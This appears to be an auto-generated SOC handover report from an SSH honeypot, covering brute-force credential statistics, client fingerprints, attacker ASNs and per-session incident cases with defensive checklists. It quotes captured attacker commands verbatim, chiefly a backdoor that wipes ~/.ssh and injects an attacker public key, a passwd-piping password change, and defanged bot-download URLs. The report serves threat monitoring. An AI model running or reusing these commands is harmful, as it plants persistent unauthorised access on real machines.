# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-28 |
| **Generated At** | 2026-10-28T17:39:07Z |
| **Shift Time** | 17:39 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **747** |
| Confirmed Threats | **655** |
| False Positives Filtered | **92** (12.3%) |
| Unique Attacker IPs | **396** |
| Countries of Origin | **58** |
| High Severity Cases | **480** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **267** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **5037** |
| Unique Credential Pairs | **1859** |
| Unique Usernames | **649** |
| Unique Passwords | **1339** |
| Successful Auth Pairs | **4783** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 1775 |
| `345gs5662d34` | 246 |
| `ubuntu` | 186 |
| `admin` | 132 |
| `user` | 90 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 251 |
| `3245gs5662d34` | 247 |
| `345gs5662d34` | 246 |
| `123` | 125 |
| `1234` | 92 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 246 |
| `root` | `3245gs5662d34` | 204 |
| `support` | `support` | 31 |
| `admin` | `admin` | 20 |
| `cloud` | `Wangsu@2017` | 18 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `minerstat` | `mmpOS` | `10.0.0.73` | 2026-10-28T00:55:06 |
| `miner` | `mmpOS` | `10.0.0.73` | 2026-10-28T00:55:41 |
| `ubuntu` | `password` | `10.0.0.73` | 2026-10-28T00:56:15 |
| `mos` | `mos` | `10.0.0.73` | 2026-10-28T00:56:49 |
| `root` | `P@ssw0rd` | `10.0.0.73` | 2026-10-28T00:57:23 |
| `root` | `1qaz@WSX3edc` | `10.0.0.73` | 2026-10-28T00:57:33 |
| `user9` | `user9` | `10.0.0.73` | 2026-10-28T00:57:43 |
| `user10` | `user10` | `10.0.0.73` | 2026-10-28T00:57:53 |
| `user2` | `user2` | `10.0.0.73` | 2026-10-28T00:58:03 |
| `super` | `super` | `10.0.0.73` | 2026-10-28T00:58:13 |
| `user4` | `user4` | `10.0.0.73` | 2026-10-28T00:58:22 |
| `user` | `p@ssw0rd` | `10.0.0.73` | 2026-10-28T00:58:32 |
| `ubuntu` | `123456` | `10.0.0.73` | 2026-10-28T00:58:42 |
| `ubuntu` | `1234567` | `10.0.0.73` | 2026-10-28T00:58:52 |
| `ubuntu` | `12345678` | `10.0.0.73` | 2026-10-28T00:59:01 |
| `ubuntu` | `123456789` | `10.0.0.73` | 2026-10-28T00:59:11 |
| `ubuntu` | `zaq123` | `10.0.0.73` | 2026-10-28T00:59:21 |
| `ubuntu` | `321qaz` | `10.0.0.73` | 2026-10-28T00:59:31 |
| `ubuntu` | `123123` | `10.0.0.73` | 2026-10-28T00:59:41 |
| `ubuntu` | `user123` | `10.0.0.73` | 2026-10-28T00:59:52 |
_… 4763 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **747** |
| Sessions with Fingerprint | **33** |
| Unique HASSH Fingerprints | **33** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 402 |
| Go SSH scanner | 109 |
| OpenSSH | 11 |
| Paramiko (Python) | 9 |
| Unknown | 7 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 352 | 177 |
| `2ec37a7cc8da...` | Mirai/variant | 66 | 3 |
| `03a80b21afa8...` | Modern SSH client | 20 | 13 |
| `390ffe68a68c...` | Modern SSH client | 9 | 4 |
| `98f63c4d9c87...` | Generic scanner | 9 | 9 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 352 | 177 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 66 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 23 | 14 | — |
| `03a80b21afa8...` | libssh | 20 | 13 | Modern SSH client |
| `390ffe68a68c...` | OpenSSH | 9 | 4 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 9 | 9 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **77** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 177 | 169 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "Wangsu@2017\nyc9juFy7EZos\nyc9juFy7EZos"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `91.122.53.183`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `156.232.10.218`, `103.207.9.246`, `197.221.232.44`, `196.50.29.16`, `130.61.148.1`, `129.121.115.10`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **396** |
| Unique ASNs | **168** |
| High-Risk ASNs | **141** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 81 | HIGH |
| `AS31898` | Oracle Corporation | 21 | HIGH |
| `AS4134` | CHINANET BACKBONE | 14 | HIGH |
| `AS8075` | Microsoft Corporation | 12 | HIGH |
| `AS396982` | Google LLC | 12 | HIGH |
| `AS4766` | Korea Telecom | 10 | HIGH |
| `AS398324` | Censys, Inc. | 10 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 9 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (471)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e7e67db7049d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-28 01:05 |
| **Last Seen** | 2026-10-28 01:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:05:53` | `cowrie.session.connect` |
| `2026-10-28 01:05:53` | `cowrie.client.version` |
| `2026-10-28 01:05:54` | `cowrie.client.kex` |
| `2026-10-28 01:05:54` | `cowrie.login.success` |
| `2026-10-28 01:05:54` | `cowrie.direct-tcpip.request` |
| `2026-10-28 01:05:54` | `cowrie.direct-tcpip.data` |
| `2026-10-28 01:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7537eecb0fa

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-10-28 01:07 |
| **Last Seen** | 2026-10-28 01:07 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:07:41` | `cowrie.session.connect` |
| `2026-10-28 01:07:41` | `cowrie.client.version` |
| `2026-10-28 01:07:42` | `cowrie.client.kex` |
| `2026-10-28 01:07:42` | `cowrie.login.success` |
| `2026-10-28 01:07:44` | `cowrie.direct-tcpip.request` |
| `2026-10-28 01:07:46` | `cowrie.direct-tcpip.ja4` |
| `2026-10-28 01:07:46` | `cowrie.direct-tcpip.data` |
| `2026-10-28 01:07:48` | `cowrie.direct-tcpip.request` |
| `2026-10-28 01:07:50` | `cowrie.direct-tcpip.ja4` |
| `2026-10-28 01:07:50` | `cowrie.direct-tcpip.data` |
| `2026-10-28 01:07:51` | `cowrie.direct-tcpip.request` |
| `2026-10-28 01:07:53` | `cowrie.direct-tcpip.ja4` |
| `2026-10-28 01:07:53` | `cowrie.direct-tcpip.data` |
| `2026-10-28 01:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9a0dbcb2d51

| Field | Detail |
|---|---|
| **Source IP** | `202.70.78[.]237` |
| **First Seen** | 2026-10-28 01:11 |
| **Last Seen** | 2026-10-28 01:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:11:45` | `cowrie.session.connect` |
| `2026-10-28 01:11:45` | `cowrie.client.version` |
| `2026-10-28 01:11:46` | `cowrie.client.kex` |
| `2026-10-28 01:11:47` | `cowrie.login.success` |
| `2026-10-28 01:11:48` | `cowrie.session.params` |
| `2026-10-28 01:11:48` | `cowrie.command.input` |
| `2026-10-28 01:11:48` | `cowrie.command.failed` |
| `2026-10-28 01:11:49` | `cowrie.log.closed` |
| `2026-10-28 01:11:50` | `cowrie.session.params` |
| `2026-10-28 01:11:50` | `cowrie.command.input` |
| `2026-10-28 01:11:50` | `cowrie.session.file_download` |
| `2026-10-28 01:11:50` | `cowrie.log.closed` |
| `2026-10-28 01:11:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.70.78[.]237` to AbuseIPDB if not already reported
- [ ] Block `202.70.78[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f867252ac04

| Field | Detail |
|---|---|
| **Source IP** | `202.70.78[.]237` |
| **First Seen** | 2026-10-28 01:11 |
| **Last Seen** | 2026-10-28 01:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:11:50` | `cowrie.session.connect` |
| `2026-10-28 01:11:50` | `cowrie.client.version` |
| `2026-10-28 01:11:51` | `cowrie.client.kex` |
| `2026-10-28 01:11:52` | `cowrie.login.success` |
| `2026-10-28 01:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.70.78[.]237` to AbuseIPDB if not already reported
- [ ] Block `202.70.78[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70104446c1a8

| Field | Detail |
|---|---|
| **Source IP** | `79.116.218[.]231` |
| **First Seen** | 2026-10-28 01:32 |
| **Last Seen** | 2026-10-28 01:32 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo VANTA_TEST, stty -echo 2>/dev/null, uname -m, cd /tmp, rm -rf bot* .bot* 2>/dev/null` |
| **Download Attempts** | hxxp://176.65.139[.]201:80/bots/bot-linux-amd64, hxxp://176.65.139[.]201:80/bots/bot-linux-amd64, hxxp://176.65.139[.]201:80/bots/bot-linux-amd64 |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:32:29` | `cowrie.session.connect` |
| `2026-10-28 01:32:31` | `cowrie.login.success` |
| `2026-10-28 01:32:31` | `cowrie.session.params` |
| `2026-10-28 01:32:32` | `cowrie.command.input` |
| `2026-10-28 01:32:32` | `cowrie.command.input` |
| `2026-10-28 01:32:33` | `cowrie.command.input` |
| `2026-10-28 01:32:33` | `cowrie.command.input` |
| `2026-10-28 01:32:33` | `cowrie.command.input` |
| `2026-10-28 01:32:34` | `cowrie.command.input` |
| `2026-10-28 01:32:34` | `cowrie.command.input` |
| `2026-10-28 01:32:34` | `cowrie.command.input` |
| `2026-10-28 01:32:36` | `cowrie.session.file_download` |
| `2026-10-28 01:32:37` | `cowrie.session.file_download` |
| `2026-10-28 01:32:38` | `cowrie.session.file_download` |
| `2026-10-28 01:32:39` | `cowrie.session.file_download` |
| … | _4 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `79.116.218[.]231` to AbuseIPDB if not already reported
- [ ] Block `79.116.218[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72dd0cff92fb

| Field | Detail |
|---|---|
| **Source IP** | `143.110.145[.]158` |
| **First Seen** | 2026-10-28 01:33 |
| **Last Seen** | 2026-10-28 01:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:33:24` | `cowrie.session.connect` |
| `2026-10-28 01:33:24` | `cowrie.client.version` |
| `2026-10-28 01:33:24` | `cowrie.client.kex` |
| `2026-10-28 01:33:25` | `cowrie.login.success` |
| `2026-10-28 01:33:25` | `cowrie.session.params` |
| `2026-10-28 01:33:25` | `cowrie.command.input` |
| `2026-10-28 01:33:25` | `cowrie.command.failed` |
| `2026-10-28 01:33:25` | `cowrie.log.closed` |
| `2026-10-28 01:33:26` | `cowrie.session.params` |
| `2026-10-28 01:33:26` | `cowrie.command.input` |
| `2026-10-28 01:33:26` | `cowrie.session.file_download` |
| `2026-10-28 01:33:26` | `cowrie.log.closed` |
| `2026-10-28 01:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.110.145[.]158` to AbuseIPDB if not already reported
- [ ] Block `143.110.145[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d4992a4a0ae

| Field | Detail |
|---|---|
| **Source IP** | `143.110.145[.]158` |
| **First Seen** | 2026-10-28 01:33 |
| **Last Seen** | 2026-10-28 01:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:33:26` | `cowrie.session.connect` |
| `2026-10-28 01:33:26` | `cowrie.client.version` |
| `2026-10-28 01:33:26` | `cowrie.client.kex` |
| `2026-10-28 01:33:27` | `cowrie.login.success` |
| `2026-10-28 01:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.110.145[.]158` to AbuseIPDB if not already reported
- [ ] Block `143.110.145[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78ba67f6a95e

| Field | Detail |
|---|---|
| **Source IP** | `39.170.108[.]144` |
| **First Seen** | 2026-10-28 01:33 |
| **Last Seen** | 2026-10-28 01:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:33:39` | `cowrie.session.connect` |
| `2026-10-28 01:33:39` | `cowrie.client.version` |
| `2026-10-28 01:33:39` | `cowrie.client.kex` |
| `2026-10-28 01:33:41` | `cowrie.login.success` |
| `2026-10-28 01:33:42` | `cowrie.session.params` |
| `2026-10-28 01:33:42` | `cowrie.command.input` |
| `2026-10-28 01:33:42` | `cowrie.command.failed` |
| `2026-10-28 01:33:42` | `cowrie.log.closed` |
| `2026-10-28 01:33:43` | `cowrie.session.params` |
| `2026-10-28 01:33:43` | `cowrie.command.input` |
| `2026-10-28 01:33:44` | `cowrie.session.file_download` |
| `2026-10-28 01:33:44` | `cowrie.log.closed` |
| `2026-10-28 01:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.170.108[.]144` to AbuseIPDB if not already reported
- [ ] Block `39.170.108[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e465b321183

| Field | Detail |
|---|---|
| **Source IP** | `190.97.35[.]185` |
| **First Seen** | 2026-10-28 01:33 |
| **Last Seen** | 2026-10-28 01:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:33:41` | `cowrie.session.connect` |
| `2026-10-28 01:33:41` | `cowrie.client.version` |
| `2026-10-28 01:33:42` | `cowrie.client.kex` |
| `2026-10-28 01:33:42` | `cowrie.login.success` |
| `2026-10-28 01:33:44` | `cowrie.session.params` |
| `2026-10-28 01:33:44` | `cowrie.command.input` |
| `2026-10-28 01:33:44` | `cowrie.command.failed` |
| `2026-10-28 01:33:44` | `cowrie.log.closed` |
| `2026-10-28 01:33:45` | `cowrie.session.params` |
| `2026-10-28 01:33:45` | `cowrie.command.input` |
| `2026-10-28 01:33:45` | `cowrie.session.file_download` |
| `2026-10-28 01:33:45` | `cowrie.log.closed` |
| `2026-10-28 01:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.97.35[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.97.35[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25e11cdff736

| Field | Detail |
|---|---|
| **Source IP** | `39.170.108[.]144` |
| **First Seen** | 2026-10-28 01:33 |
| **Last Seen** | 2026-10-28 01:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:33:44` | `cowrie.session.connect` |
| `2026-10-28 01:33:44` | `cowrie.client.version` |
| `2026-10-28 01:33:44` | `cowrie.client.kex` |
| `2026-10-28 01:33:46` | `cowrie.login.success` |
| `2026-10-28 01:33:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.170.108[.]144` to AbuseIPDB if not already reported
- [ ] Block `39.170.108[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed8361dfef3e

| Field | Detail |
|---|---|
| **Source IP** | `190.97.35[.]185` |
| **First Seen** | 2026-10-28 01:33 |
| **Last Seen** | 2026-10-28 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:33:45` | `cowrie.session.connect` |
| `2026-10-28 01:33:45` | `cowrie.client.version` |
| `2026-10-28 01:33:45` | `cowrie.client.kex` |
| `2026-10-28 01:33:47` | `cowrie.login.success` |
| `2026-10-28 01:33:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.97.35[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.97.35[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60816af448f5

| Field | Detail |
|---|---|
| **Source IP** | `103.189.89[.]145` |
| **First Seen** | 2026-10-28 01:34 |
| **Last Seen** | 2026-10-28 01:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:34:22` | `cowrie.session.connect` |
| `2026-10-28 01:34:22` | `cowrie.client.version` |
| `2026-10-28 01:34:22` | `cowrie.client.kex` |
| `2026-10-28 01:34:23` | `cowrie.login.success` |
| `2026-10-28 01:34:24` | `cowrie.session.params` |
| `2026-10-28 01:34:24` | `cowrie.command.input` |
| `2026-10-28 01:34:24` | `cowrie.command.failed` |
| `2026-10-28 01:34:25` | `cowrie.log.closed` |
| `2026-10-28 01:34:26` | `cowrie.session.params` |
| `2026-10-28 01:34:26` | `cowrie.command.input` |
| `2026-10-28 01:34:26` | `cowrie.session.file_download` |
| `2026-10-28 01:34:26` | `cowrie.log.closed` |
| `2026-10-28 01:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.89[.]145` to AbuseIPDB if not already reported
- [ ] Block `103.189.89[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
